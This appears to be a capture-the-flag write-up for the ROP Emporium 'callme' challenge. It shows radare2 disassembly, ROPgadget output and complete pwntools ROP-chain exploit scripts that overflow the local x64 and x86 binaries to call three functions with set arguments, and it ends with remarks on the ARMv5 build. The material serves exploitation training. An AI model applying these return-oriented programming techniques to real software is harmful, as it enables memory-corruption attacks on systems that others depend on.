# callme

## x64

Lets analyze the binary with r2. Similar to the previous challenges, the interesting function is `usefulFunction`.

```bash
$ r2 callme
[0x00400760]> aa
[x] Analyze all flags starting with sym. and entry0 (aa)
[0x00400760]> s sym.usefulFunction
[0x004008f2]> pdf
┌ 74: sym.usefulFunction ();
│           0x004008f2      55             push rbp
│           0x004008f3      4889e5         mov rbp, rsp
│           0x004008f6      ba06000000     mov edx, 6
│           0x004008fb      be05000000     mov esi, 5
│           0x00400900      bf04000000     mov edi, 4
│           0x00400905      e8e6fdffff     call sym.imp.callme_three
│           0x0040090a      ba06000000     mov edx, 6
│           0x0040090f      be05000000     mov esi, 5
│           0x00400914      bf04000000     mov edi, 4
│           0x00400919      e822feffff     call sym.imp.callme_two
│           0x0040091e      ba06000000     mov edx, 6
│           0x00400923      be05000000     mov esi, 5
│           0x00400928      bf04000000     mov edi, 4
│           0x0040092d      e8eefdffff     call sym.imp.callme_one
│           0x00400932      bf01000000     mov edi, 1
└           0x00400937      e814feffff     call sym.imp.exit           ; void exit(int status)
```

Given the instructions, we must call `callme_one`, `callme_two`, and `callme_three` in that order each with the arguments `0xdeadbeef`, `0xcafebabe`, `0xd00df00d` (For 64bit `0xdeadbeefdeadbeef`, `0xcafebabecafebabe`, `0xd00df00dd00df00d`).

Given there are three arguments to be passed into functions and it is a 64 bit binary, we must load them into registers. Specifically the $rdi, $rsi, and $rdx respectively. So we need to pop all three. Using ROPGadget we can identify where the gadgets are.

```bash
$ ROPgadget --binary callme| grep "pop rdi"
0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret
```

So our ROP chain is pretty simple. For each function, hit that address then pass in each argument and call the function at the end.

```py
#!/usr/bin/env python3

from pwn import *

binary = ELF("./callme")
context.binary = binary
rop = ROP(binary)

p = process(binary.path)
p.recvuntil(b">")

OFFSET = 40
POP_ADDR = p64(0x40093c)
ARG_1 = p64(0xdeadbeefdeadbeef)
ARG_2 = p64(0xcafebabecafebabe)
ARG_3 = p64(0xd00df00dd00df00d)

rop.raw(b"A"*OFFSET)

for fun in ["callme_one", "callme_two", "callme_three"]:
    rop.raw(POP_ADDR)
    rop.raw(ARG_1)
    rop.raw(ARG_2)
    rop.raw(ARG_3)
    rop.raw(binary.symbols[fun])

p.sendline(rop.chain())
print(p.recvall().decode("utf-8").split("\n")[-2])
```

## x86

The method of calling functions is a little more complicated since we must call functions thrice, which means we cannot just pass the arguments into the stack and call the function; the first function will call correctly, but the others wont. So we need to call a ret function to somewhat 'reset' our position so the next function can be called.

```bash
$ ROPgadget --binary callme32 | grep ret
0x080487f9 : pop esi ; pop edi ; pop ebp ; ret
```

This seems to be a good candidate. So our ROP chain will consist of address for function call + address for ret + arguments. Below is the script to yield the flag.

```py
#!/usr/bin/env python3

from pwn import *

binary = ELF("./callme32")
context.binary = binary
rop = ROP(binary)

p = process(binary.path)
p.recvuntil(b">")

OFFSET = 44 
RET_ADDR = p32(0x80487f9)
ARG_1 = p32(0xdeadbeef)
ARG_2 = p32(0xcafebabe)
ARG_3 = p32(0xd00df00d)

rop.raw(b"A"*OFFSET)

for fun in ["callme_one", "callme_two", "callme_three"]:
    rop.raw(binary.symbols[fun])
    rop.raw(RET_ADDR)
    rop.raw(ARG_1)
    rop.raw(ARG_2)
    rop.raw(ARG_3)

p.sendline(rop.chain())
print(p.recvall().decode("utf-8").split("\n")[-2])
```


## ARMv5

I'm not sure why a callme_armv5 and a callme_armv5-hf were supplied. Regardless, the latter will not execute because of a missing `/lib/ld-linux-armhf.so.3`. This didn't even seem to install in my `/usr/arm-linux-gnueabi`, and the instructions on ROP emporium do not help. Using `callme_armv5` is an absolute nightmare though.
